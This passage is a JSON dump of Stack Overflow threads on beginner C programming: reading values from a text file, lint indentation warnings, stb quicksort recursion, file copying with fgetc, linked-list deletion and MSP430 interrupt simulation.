"https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544631437, "post_id": 53742329, "comment_id": 94346781, "body": "@MajidRafei  really sorry then .. not sure any compiler trick,  i am seeing      output  as  &quot;var1 is found= 10&quot;     when I run this program"}, {"owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544632928, "post_id": 53742329, "comment_id": 94347616, "body": "but, that really helped me. I have another problem though; I have make a sub-function for search and used your code in that. I opened the text file at the beginning of main() and do some search and close text file at the end of main(). It is seen that every time I call search() function and also fgets, it continues to get the next line (the next line after last call !), it does not start from the very beginning of the text file. How can i solve this? I want to read and search the text file from the beginning to find each &quot;var&quot;."}, {"owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "reply_to_user": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "edited": false, "score": 0, "creation_date": 1544635151, "post_id": 53742329, "comment_id": 94348783, "body": "thanks,if you want beging everytime from start, you have to use rewind() or fseek() API  to move file pointer to begining, so you have to call fseek like fseek(pSrcFile, 0L, SEEK_SET) ,  plz refer API documentation to known more about APIs"}], "tags": [], "owner": {"reputation": 368, "user_id": 10735689, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/aPtkk.png?s=128&g=1", "display_name": "ShivYaragatti", "link": "https://stackoverflow.com/users/10735689/shivyaragatti"}, "is_accepted": false, "score": 0, "last_activity_date": 1544615075, "creation_date": 1544615075, "answer_id": 53742329, "question_id": 53740841, "link": "https://stackoverflow.com/questions/53740841/c-language-search-text-file-for-a-word-and-store-the-value-into-int-and-flout/53742329#53742329", "title": "C Language: Search text file for a &quot;word&quot; and store the value into int and flout type variables", "body": "<p>I have modified your pogram to work, check and understand what was missing.</p>\n\n<pre><code> #include&lt;stdio.h&gt;\n #include&lt;string.h&gt;\n #include&lt;stdlib.h&gt;\n\nint main()\n{\n\n char cBuffer[256]={'\\0'};\n FILE *pSrcFile;\n\n pSrcFile = fopen(\"vars.txt\",\"r\");\n int var1;\n while((fgets(cBuffer, 256 , pSrcFile)) != NULL )\n {\n    if(strncmp(cBuffer, \"var1\", sizeof(\"var1\")-1 ) == 0 )\n     {\n       fscanf(pSrcFile, \"%d\" , &amp;var1 );\n       printf(\"var1 is found= %d\\n\",var1);\n       break;\n     }\n  }\n</code></pre>\n\n<p>}</p>\n\n<p>basically added strncmp() to avoid new line if any in bcBuffer, else it would not be equall so if() will not be true, it is not standard way of programming but crude way of making it working(all can't be explained here) .</p>\n"}, {"tags": [], "owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "is_accepted": true, "score": 0, "last_activity_date": 1544693694, "last_edit_date": 1544693694, "creation_date": 1544691567, "answer_id": 53758201, "question_id": 53740841, "link": "https://stackoverflow.com/questions/53740841/c-language-search-text-file-for-a-word-and-store-the-value-into-int-and-flout/53758201#53758201", "title": "C Language: Search text file for a &quot;word&quot; and store the value into int and flout type variables", "body": "<p>Finally, I found the solution of the problem with this code (thanks to the other answers). The code searches for the <strong><em>word</em></strong> and return the next <strong><em>value</em></strong> after word.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint search_word_int( char *word , FILE *file , int *step )\n{\n    fseek(file, 0, SEEK_SET);\n    char dummy[strlen(word)+1];\n    int step_ = step;\n    int variable = 0;\n    while((fgets(dummy, strlen(word)+1 , file)) != NULL )\n    {\n        if(strncmp(dummy, word, strlen(word)+1 ) == 0 )\n        {\n            for (int i = 0 ; i &lt; step_ + 1 ; i++)\n                fscanf(file, \"%d\" , &amp;variable );\n            printf(\"%s = %d\\n\",word,variable);\n            break;\n        }\n    }\n    return(variable);\n}\n\nfloat   search_word_float( char *word , FILE *file , int *step )\n{\n    fseek(file, 0, SEEK_SET);\n    char dummy[strlen(word)+1];\n    int     step_ = step;\n    float   variable = 0;\n    while( (fgets( dummy , strlen(word)+1 , file )) != NULL )\n    {\n        if( strncmp(dummy, word, strlen(word)+1 ) == 0 )\n        {\n            for (int i = 0 ; i &lt; step_ + 1 ; i++)\n                fscanf( file , \"%f\" , &amp;variable );\n            printf(\"%s = %f\\n\",word,variable);\n            break;\n        }\n    }\n    return(variable);\n}\n\nint main()\n{\n    FILE    *file;\n    file = fopen(\"vars.txt\",\"r\");\n    int var1 = search_word_int( \"var1\" , file , 1 );\n    float var2 = search_word_float( \"var2\" , file , 2 );\n    fclose(file);\n    return(0);\n}\n</code></pre>\n\n<p>If text file (\"vars.txt\") is:</p>\n\n<pre><code>var1\n10\nvar2     2.3\n4.5\n</code></pre>\n\n<p>Then the result is:</p>\n\n<pre><code>var1 = 10\nvar2 = 4.5\n</code></pre>\n\n<p>Blank spaces, new line, and tab characters are ignored.</p>\n"}], "owner": {"reputation": 25, "user_id": 4733542, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/099d6e4f94e44be0bdeaa45990b7f41d?s=128&d=identicon&r=PG&f=1", "display_name": "Majid Rafei", "link": "https://stackoverflow.com/users/4733542/majid-rafei"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 84, "favorite_count": 0, "accepted_answer_id": 53758201, "answer_count": 3, "score": -2, "last_activity_date": 1544694861, "creation_date": 1544610115, "last_edit_date": 1544694861, "question_id": 53740841, "link": "https://stackoverflow.com/questions/53740841/c-language-search-text-file-for-a-word-and-store-the-value-into-int-and-flout", "title": "C Language: Search text file for a &quot;word&quot; and store the value into int and flout type variables", "body": "<p>For example text file (vars.txt) contains:</p>\n\n<pre><code>var1\n10\nvar2\n3.54\nvar3\n10110\n</code></pre>\n\n<p>I want to read the text file and store the value of var1 (which is the next line after var1 in text file) into a variable in my program.\nI have the following code but seems not working:</p>\n\n<pre><code>char cBuffer[256];\nFILE *pSrcFile;\npSrcFile = fopen(\"vars.txt\",\"r\");\nwhile( (fgets( cBuffer, 256 , pSrcFile)) != NULL )\n{\n    if( strcmp( cBuffer, \"var1\" ) != NULL )\n    {\n        sscanf( pSrcFile, \"%d\" , &amp;var1 );\n        printf(\"var1 is found= %d\",var1);\n        break;\n    }\n}\n</code></pre>\n\n<p>How can I convert and save strings of a text file into int, flout, and binary type variables?</p>\n\n<p>In other words, I want to search the text file to find \"var1\" and then save the next line (the value of \"var1\") to an integer variable and repeat this to search and store the value of \"var2\" into a float variable and \"var3\" into a binary variable an so on.</p>\n"}, {"tags": ["c", "for-loop", "lint"], "comments": [{"owner": {"reputation": 8251, "user_id": 2912665, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/XrRhd.jpg?s=128&g=1", "display_name": "CinCout", "link": "https://stackoverflow.com/users/2912665/cincout"}, "edited": false, "score": 0, "creation_date": 1544608464, "post_id": 53740250, "comment_id": 94333202, "body": "Does this even compile?"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544608715, "post_id": 53740250, "comment_id": 94333359, "body": "Assuming this was an example, I fixed obvious errors."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 2, "creation_date": 1544608882, "post_id": 53740250, "comment_id": 94333460, "body": "@PaulOgilvie: but at the same time you removed the problem that <code>lint</code> was warning for!"}, {"owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "reply_to_user": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "edited": false, "score": 0, "creation_date": 1544608931, "post_id": 53740250, "comment_id": 94333492, "body": "@usr2564301,I didn&#39;t want to copy the code to my answer."}, {"owner": {"reputation": 20968, "user_id": 2564301, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/a6b5734cdcb5ce19598ccf9a7d8cc1ff?s=128&d=identicon&r=PG&f=1", "display_name": "Jongware", "link": "https://stackoverflow.com/users/2564301/jongware"}, "reply_to_user": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "edited": false, "score": 0, "creation_date": 1544609106, "post_id": 53740250, "comment_id": 94333597, "body": "@PaulOgilvie: well, why not, if it makes your answer more clear. But <i>editing out</i> the problem that is asked about is an absolute no-no."}], "answers": [{"tags": [], "owner": {"reputation": 23946, "user_id": 3100312, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/486be6e961e6c8a2e4705058600e666f?s=128&d=identicon&r=PG&f=1", "display_name": "Paul Ogilvie", "link": "https://stackoverflow.com/users/3100312/paul-ogilvie"}, "is_accepted": false, "score": 1, "last_activity_date": 1548942529, "last_edit_date": 1548942529, "creation_date": 1544608479, "answer_id": 53740312, "question_id": 53740250, "link": "https://stackoverflow.com/questions/53740250/lint-warning-expected-positive-indentation/53740312#53740312", "title": "Lint Warning Expected positive indentation", "body": "<p>I have \"positively indented your code\". That is what properly formatted code should look like: with every code block or loop, indent 4 spaces or 1 tab.</p>\n\n<pre><code>fun lint(U16 c, U16 d, U16 e, U16 nr)\n{\n    struct x *something[50];\n    for(U16 i=0; i&lt;nr; i++) //Expected positive indentation\n    {\n        something[i] = malloc(sizeof(struct x) *nr); //something[i] complains here\n        something[i]-&gt;ab.c = c; //something[i] complains here\n        something[i]-&gt;ab.d = d; //something[i] complains here\n        something[i]-&gt;nrofthing = nr; //something[i] complains here\n        something[i]-&gt;ab.e =e; //something[i] complains here\n    }\n}\n</code></pre>\n\n<p>With such indentation, it is easy to see where blocks, functions and loops start and end, making it easier to read the code.</p>\n\n<p>Lint complained that you did not properly follow the rules on indentation.</p>\n"}], "owner": {"reputation": 85, "user_id": 8295555, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17a0d185020dc047f2b8a7b32c6e3345?s=128&d=identicon&r=PG&f=1", "display_name": "Raaz444", "link": "https://stackoverflow.com/users/8295555/raaz444"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1362, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1548942529, "creation_date": 1544608268, "last_edit_date": 1544608896, "question_id": 53740250, "link": "https://stackoverflow.com/questions/53740250/lint-warning-expected-positive-indentation", "title": "Lint Warning Expected positive indentation", "body": "<p>I have an for loop which assign values to the members in a struct, depending upon the number(nr), but when i tried to Lint this piece of code it complains <strong>Expected positive indentation</strong> what does that mean ? what is wrong in this snippet</p>\n\n<pre><code>fun lint(U16 c, U16 d, U16 e, U16 nr)\n{\nstruct* something[50]\nfor(U16 i=0; i&lt;nr; i++) //Expected positive indentation\n{\nsomething[i] = alloc(sizeof(struct) *nr); //something[i] complains here\nsomething[i] -&gt; ab.c = c; //something[i] complains here\nsomething[i] -&gt; ab.d = d; //something[i] complains here\nsomething[i] -&gt; nrofthing = nr; //something[i] complains here\nsomething[i] -&gt; ab.e =e; //something[i] complains here\n}\n}\n</code></pre>\n\n<p>Thank you!</p>\n"}, {"tags": ["c", "sorting"], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10724554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/720e38c77a0362ef56f9b8753b2eb181?s=128&d=identicon&r=PG&f=1", "display_name": "JackDremo", "link": "https://stackoverflow.com/users/10724554/jackdremo"}, "edited": false, "score": 0, "creation_date": 1544609757, "post_id": 53740622, "comment_id": 94333984, "body": "cool. do you have any resources as to how i can calculate the O(log(n)) for worst case stack space? it makes sense to me that we would want to reduce the stack overhead due to recursions, but how do you know that if we recurse on the smaller half it requires O(log(n)) stack space? Thanks!  my theory is that worst case the smaller half is n/2 elements, so since it is halved every time O(log(n)). I&#39;m not a Computer Scientist, so my understanding of Order notation is a little bit bad, but is this true?"}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "reply_to_user": {"reputation": 13, "user_id": 10724554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/720e38c77a0362ef56f9b8753b2eb181?s=128&d=identicon&r=PG&f=1", "display_name": "JackDremo", "link": "https://stackoverflow.com/users/10724554/jackdremo"}, "edited": false, "score": 0, "creation_date": 1544616972, "post_id": 53740622, "comment_id": 94338234, "body": "Assume that the smaller part is 1/2 of the current sub-array. Then it will take log2(n) levels of recursion where the smaller part only contains a single element. Think of this as raising 1/2 to the power of the level of recursion, then (1/2)^(\u2308log2(n)\u2309)  ~= 1/n, and 1/n * n = 1."}, {"owner": {"reputation": 13, "user_id": 10724554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/720e38c77a0362ef56f9b8753b2eb181?s=128&d=identicon&r=PG&f=1", "display_name": "JackDremo", "link": "https://stackoverflow.com/users/10724554/jackdremo"}, "edited": false, "score": 0, "creation_date": 1544621120, "post_id": 53740622, "comment_id": 94340487, "body": "thanks i appreciate your assistance. that helped me a lot."}], "tags": [], "owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "is_accepted": true, "score": 1, "last_activity_date": 1544609398, "creation_date": 1544609398, "answer_id": 53740622, "question_id": 53740176, "link": "https://stackoverflow.com/questions/53740176/stb-library-quicksort-implementation/53740622#53740622", "title": "STB Library Quicksort Implementation", "body": "<p>Iterating on the larger part and only using recursion for the smaller part reduces used stack space to O(log(n)), otherwise worst case stack space is O(n). The worst case time complexity remains at O(n^2). Time complexity can be reduced by checking for excessive number of partition splits and switching to heap sort if the splits become excessive, such as intro sort.</p>\n"}], "owner": {"reputation": 13, "user_id": 10724554, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/720e38c77a0362ef56f9b8753b2eb181?s=128&d=identicon&r=PG&f=1", "display_name": "JackDremo", "link": "https://stackoverflow.com/users/10724554/jackdremo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 40, "favorite_count": 0, "accepted_answer_id": 53740622, "answer_count": 1, "score": 1, "last_activity_date": 1544609398, "creation_date": 1544607971, "question_id": 53740176, "link": "https://stackoverflow.com/questions/53740176/stb-library-quicksort-implementation", "title": "STB Library Quicksort Implementation", "body": "<p>I am reading the source code for Sean Barrett's \"stb.h\" library, and I have a question about the implementation of Quick Sort.</p>\n\n<p><a href=\"https://pastebin.com/gpfXTuL8\" rel=\"nofollow noreferrer\">https://pastebin.com/gpfXTuL8</a></p>\n\n<p>So, I am particularly confused about the following excerpt:</p>\n\n<pre><code>/* recurse on smaller side, iterate on larger */                        \\\n  if (j &lt; (n-i)) {                                                        \\\n     STB_(FUNCNAME,_quicksort)(p,j);                                       \\\n     p = p+i;                                                             \\\n     n = n-i;                                                             \\\n  } else {                                                                \\\n     STB_(FUNCNAME,_quicksort)(p+i, n-i);                                  \\\n     n = j;                                                               \\\n  }      \n</code></pre>\n\n<p>i don't get why the library chooses to recurse on the smaller side and iterate on the larger one; in the end aren't they both just going to execute the function from the beginning with updated p and n? i don't speak English too well, so if you need further clarification, I would be glad to provide it.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 1, "creation_date": 1544607933, "post_id": 53740151, "comment_id": 94332917, "body": "<code>if (orginalFile == NULL | newFile == NULL)</code> ==&gt; <code>if (orginalFile == NULL || newFile == NULL)</code>"}, {"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544608002, "post_id": 53740151, "comment_id": 94332958, "body": "<code>EOF</code> cannot be contained in a <code>char</code>, you&#39;d need an <code>int</code>."}], "answers": [{"comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544608040, "post_id": 53740185, "comment_id": 94332986, "body": "and, the bitwise OR should be logical OR."}], "tags": [], "owner": {"reputation": 165665, "user_id": 721269, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/346ca03edfbde2a468adc289867ab975?s=128&d=identicon&r=PG", "display_name": "David Schwartz", "link": "https://stackoverflow.com/users/721269/david-schwartz"}, "is_accepted": false, "score": 2, "last_activity_date": 1544608057, "last_edit_date": 1544608057, "creation_date": 1544608003, "answer_id": 53740185, "question_id": 53740151, "link": "https://stackoverflow.com/questions/53740151/im-trying-to-copy-one-text-file-to-another-using-c/53740185#53740185", "title": "I&#39;m trying to copy one text file to another using c", "body": "<pre><code>  while((c = fgetc(orginalFile))!=EOF)\n  {\n     fputc(c,newFile);\n     c = fgetc(orginalFile);\n   }\n</code></pre>\n\n<p>Two mistakes here:</p>\n\n<ol>\n<li><p>You call <code>fgetc</code> twice in the loop, which throws every other character away.</p></li>\n<li><p>You compare <code>c</code> to <code>EOF</code>. You're suppose to compare the return value of <code>fgetc</code> to <code>EOF</code>. If you think they're the same, remember that <code>c</code> is of type <code>char</code> and <code>fgetc</code> returns an <code>int</code>.</p></li>\n</ol>\n\n<p>Also:</p>\n\n<pre><code>    if (orginalFile == NULL | newFile == NULL)\n</code></pre>\n\n<p>One mistake here. You have <code>|</code> which is bitwise OR, but you want <code>||</code>, which is a logical OR.</p>\n"}], "owner": {"reputation": 11, "user_id": 10442151, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-fTGHPjTsTo4/AAAAAAAAAAI/AAAAAAAAAAA/AAN31DX5MuSGLsT8p1UfjEanNITvRFnVPw/mo/photo.jpg?sz=128", "display_name": "Aimee Boyle", "link": "https://stackoverflow.com/users/10442151/aimee-boyle"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 32, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544608057, "creation_date": 1544607881, "question_id": 53740151, "link": "https://stackoverflow.com/questions/53740151/im-trying-to-copy-one-text-file-to-another-using-c", "title": "I&#39;m trying to copy one text file to another using c", "body": "<p>I'm trying to copy one test file to another in C. However my code is not working the program runs fine and produces a file CircleCode_temp but there is nothing in the text file. Any ideas why its not working </p>\n\n<pre><code>   #include &lt;stdio.h&gt;\n   #include &lt;stdlib.h&gt;\n\n   char c; \n\n  int main(int argc, char **argv)\n  {\n\n  FILE *orginalFile = fopen(\"CircleCode1\", \"r\");\n  FILE *newFile = fopen(\"CircleCode_temp\", \"w\");\n\n\n    if (orginalFile == NULL | newFile == NULL)\n     {\n       printf(\"Cannot open file\");\n       exit(0);\n     }\n\n\n      while((c = fgetc(orginalFile))!=EOF)\n      {\n         fputc(c,newFile);\n         c = fgetc(orginalFile);\n       }\n\n\n      fclose(orginalFile);\n      fclose(newFile);\n\n     return 0;\n   }\n</code></pre>\n"}, {"tags": ["c", "list"], "comments": [{"owner": {"reputation": 127623, "user_id": 2173917, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/4dwoM.jpg?s=128&g=1", "display_name": "Sourav Ghosh", "link": "https://stackoverflow.com/users/2173917/sourav-ghosh"}, "edited": false, "score": 0, "creation_date": 1544607321, "post_id": 53739983, "comment_id": 94332551, "body": "See this: <a href=\"https://stackoverflow.com/q/605845/2173917\">Do I cast the result of malloc?</a>"}], "answers": [{"comments": [{"owner": {"reputation": 11, "user_id": 10471404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4088c475bfa71be3ced621ebc46447c?s=128&d=identicon&r=PG&f=1", "display_name": "Alex_79", "link": "https://stackoverflow.com/users/10471404/alex-79"}, "edited": false, "score": 0, "creation_date": 1544636828, "post_id": 53740337, "comment_id": 94349775, "body": "&#39;else if(curr-&gt;info==val){       \t\t\t \t\t\t(*P)-&gt;next=curr-&gt;next; \t\t\tfree(curr); \t\t\tcurr=NULL; \t\t\t}&#39; \t I&#39;ve modified this part of the code so that prec doen&#39;t necessarly punt to NULL, but now, for every number I want to cancel, the code cancels just the element of the last node.\tI don&#39;t understand"}], "tags": [], "owner": {"reputation": 190, "user_id": 7176709, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7e179e3c0c654ceffd3b0224a22f7a83?s=128&d=identicon&r=PG&f=1", "display_name": "awakened", "link": "https://stackoverflow.com/users/7176709/awakened"}, "is_accepted": false, "score": 0, "last_activity_date": 1544608574, "creation_date": 1544608574, "answer_id": 53740337, "question_id": 53739983, "link": "https://stackoverflow.com/questions/53739983/delete-element-from-a-list/53740337#53740337", "title": "delete element from a list", "body": "<p>In your function <code>cancel</code>, <code>P</code> is definitely not <code>NULL</code> (assuming OS has assigned it an address initially).\n<code>prec</code> is <code>NULL</code> the before execution enters <code>if</code> loop.\nSo, execution executes the line</p>\n\n<pre><code>if(curr-&gt;info==val)\n</code></pre>\n\n<p>Now, if the value, <code>val</code>, you have provided doesn't match <code>curr-&gt;info</code> then execution exits the function without deleting any node.</p>\n"}], "owner": {"reputation": 11, "user_id": 10471404, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b4088c475bfa71be3ced621ebc46447c?s=128&d=identicon&r=PG&f=1", "display_name": "Alex_79", "link": "https://stackoverflow.com/users/10471404/alex-79"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 50, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1544609240, "creation_date": 1544607275, "last_edit_date": 1544609240, "question_id": 53739983, "link": "https://stackoverflow.com/questions/53739983/delete-element-from-a-list", "title": "delete element from a list", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;malloc.h&gt;\n\nstruct el {\n    int info;\n    struct el* next;\n};\n\nstruct el* create_el(struct el* Li)\n{\n    int num;\n\n    printf(\"\\n\\nInsert number:\\n\\n\");\n    scanf(\"%d\", &amp;num);\n\n    Li = (struct el*)malloc(sizeof(struct el));\n\n    if (Li != NULL) {\n        Li-&gt;info = num;\n        Li-&gt;next = NULL;\n    }\n    return (Li);\n}\n\nstruct el* push(struct el* L, struct el* e)\n{ //inserts the elements from the head of the list\n    if (L == NULL)\n        return (e);\n    else {\n        e-&gt;next = L;\n        L = e;\n        return (L);\n    }\n}\n\nvoid visualize(struct el* primo)\n{\n    printf(\"\\n\\nList--&gt;\");\n\n    while (primo-&gt;next != NULL) {\n        printf(\"%d\", primo-&gt;info);\n        printf(\"--&gt;\");\n        primo = primo-&gt;next;\n    }\n    if (primo-&gt;next == NULL)\n        printf(\"%d--&gt;NULL\", primo-&gt;info);\n}\n\nstruct el* cancel(struct el** P, int val)\n{ //delete element\n    struct el* prec = NULL;\n    struct el* curr = (*P);\n\n    if (P == NULL) //case empty list\n        return NULL;\n    else if (prec == NULL) {\n        if (curr-&gt;info == val) { //case 2 : if the element is the head\n            (*P)-&gt;next = curr-&gt;next;\n            free(curr);\n            curr = NULL;\n        }\n    }\n    else {\n        while ((curr != NULL) &amp;&amp; (curr-&gt;info != val)) {\n            prec = curr;\n            curr = curr-&gt;next;\n        }\n        if (curr-&gt;next == NULL &amp;&amp; curr-&gt;info == val) { // case 3: the elemnt is the last one\n            prec-&gt;next = NULL;\n            free(curr);\n            curr = NULL;\n            return (prec);\n        }\n        else {\n            if (curr-&gt;info == val) { //other cases\n                prec-&gt;next = curr-&gt;next;\n                free(curr);\n                curr = NULL;\n                return (prec);\n            }\n        }\n    }\n}\n\nint main()\n{\n    struct el* head = NULL;\n    struct el* element;\n    struct el* list = NULL;\n\n    int i, n;\n    int elem;\n\n    printf(\"Insert the number of elements for the list:\\n\\n\");\n    scanf(\"%d\", &amp;n);\n\n    for (i = 0; i &lt;= n; i++) {\n        element = create_el(head);\n        if (element != NULL) {\n            list = push(list, element);\n        }\n    }\n\n    visualize(list);\n\n    printf(\"\\n\\nInsert the element that you want to cancel:\");\n    elem = scanf(\"%d\", &amp;elem);\n\n    cancel(&amp;list, elem);\n\n    visualize(list);\n}\n</code></pre>\n\n<p>All I've wanted to do was delete an element from a listr, but after all the procediment the list is printed without any modification.</p>\n\n<p>Can anyone see whats wrong in the function cancel(which is meant to delete an element by including any possible position of it)?</p>\n"}, {"tags": ["c", "embedded", "microcontroller", "msp430", "iar"], "comments": [{"owner": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 3, "creation_date": 1544606771, "post_id": 53739522, "comment_id": 94332185, "body": "Probably the debugger disables interrupt during single step etc? The key to successful embedded programming is otherwise to never use simulators and always program on-chip."}, {"owner": {"reputation": 51, "user_id": 7721678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcaaf0d3ee8c81eb3fcd2d01d43af680?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/7721678/dennis"}, "reply_to_user": {"reputation": 153119, "user_id": 584518, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/RZLo7.png?s=128&g=1", "display_name": "Lundin", "link": "https://stackoverflow.com/users/584518/lundin"}, "edited": false, "score": 0, "creation_date": 1544609316, "post_id": 53739522, "comment_id": 94333716, "body": "Thank you for your comment probably this is the best way of working. I just would like to do this for some quick test."}, {"owner": {"reputation": 157205, "user_id": 11654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/586424ca0847070dc1868aa58077003e?s=128&d=identicon&r=PG", "display_name": "CL.", "link": "https://stackoverflow.com/users/11654/cl"}, "edited": false, "score": 0, "creation_date": 1544613602, "post_id": 53739522, "comment_id": 94336266, "body": "What exactly do you mean with &quot;rejected&quot;? What happens when you set SVML/HIFG manually?"}, {"owner": {"reputation": 51, "user_id": 7721678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcaaf0d3ee8c81eb3fcd2d01d43af680?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/7721678/dennis"}, "edited": false, "score": 0, "creation_date": 1544774979, "post_id": 53739522, "comment_id": 94402492, "body": "My interrupt log shows the interrupt is rejected. I&#39;ll try to set it manually"}, {"owner": {"reputation": 51, "user_id": 7721678, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fcaaf0d3ee8c81eb3fcd2d01d43af680?s=128&d=identicon&r=PG&f=1", "display_name": "Dennis", "link": "https://stackoverflow.com/users/7721678/dennis"}, "edited": false, "score": 0, "creation_date": 1545297289, "post_id": 53739522, "comment_id": 94578438, "body": "Thanks for the help. I decided to simulate things manually and don&#39;t use the IDE for that."}], "owner": {"reputation": 51, "user_id": 7721678, "user_type": "registered", "profile_image": 